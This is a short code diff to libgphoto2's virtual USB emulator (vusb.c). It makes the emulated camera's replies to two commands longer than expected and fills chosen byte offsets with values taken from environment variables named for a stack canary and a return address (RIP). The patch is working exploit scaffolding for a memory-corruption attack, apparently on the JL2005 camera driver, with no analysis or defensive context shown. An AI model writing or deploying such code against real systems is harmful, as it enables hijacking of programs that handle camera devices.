@@ -1,0 +1,40 @@
+--- a/libgphoto2_port/vusb/vusb.c
++++ b/libgphoto2_port/vusb/vusb.c
+@@ -174,7 +174,37 @@
+ 		{
+ 			int n = size;
+ 			if (m2[0] == 's' && n > 0x3E20) n = 0x3E20;
++			if (m2[0] == 'p') {
++				const char *ls = getenv("M2SHELL_JL2005_LEN");
++				int lim = ls ? (int)strtol(ls, NULL, 0) : 0x3E38;
++				if (n > lim) n = lim;
++			}
+ 			memset(bytes, 0x5a, (size_t)n);
++			if (m2[0] == 'p') {
++				const char *ts = getenv("M2SHELL_JL2005_TOP");
++				if (ts && n >= 0x3E38) {
++					unsigned long long v = strtoull(ts, NULL, 0);
++					int i;
++					for (i = 0; i < 8; i++)
++						bytes[0x3E30+i] = (char)((v >> (8*i)) & 0xff);
++				}
++			}
++			if (m2[0] == 'c' && n >= 0x3E40) {
++				const char *ks = getenv("M2SHELL_JL2005_CANARY");
++				const char *rs = getenv("M2SHELL_JL2005_RIP");
++				if (ks) {
++					unsigned long long v = strtoull(ks, NULL, 0);
++					int i;
++					for (i = 0; i < 8; i++)
++						bytes[0x3E28+i] = (char)((v >> (8*i)) & 0xff);
++				}
++				if (rs) {
++					unsigned long long v = strtoull(rs, NULL, 0);
++					int i;
++					for (i = 0; i < 8; i++)
++						bytes[0x3E38+i] = (char)((v >> (8*i)) & 0xff);
++				}
++			}
+ 			return n;
+ 		}
+ 	}
